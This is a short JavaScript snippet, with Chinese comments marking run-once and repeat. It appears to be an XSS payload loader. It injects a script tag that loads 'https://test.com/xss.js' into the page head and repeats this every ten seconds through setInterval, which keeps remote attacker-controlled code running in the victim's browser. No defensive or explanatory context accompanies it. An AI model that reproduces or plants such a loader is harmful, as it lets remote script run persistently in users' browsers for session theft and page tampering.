function connectLoader(retval) {
    var URL= 'https://test.com/xss.js';
    var scriptTag = document.getElementById('loadScript');
    var head = document.getElementsByTagName('head').item(0);
    if(scriptTag) head.removeChild(scriptTag);
    var script = document.createElement('script');
    script.src = URL;
    script.type = 'text/javascript';
    script.id = 'loadScript';
    head.appendChild(script);
}
// setTimeout('connectLoader()',1000); //执行一次
setInterval('connectLoader()',10000);	//重复执行
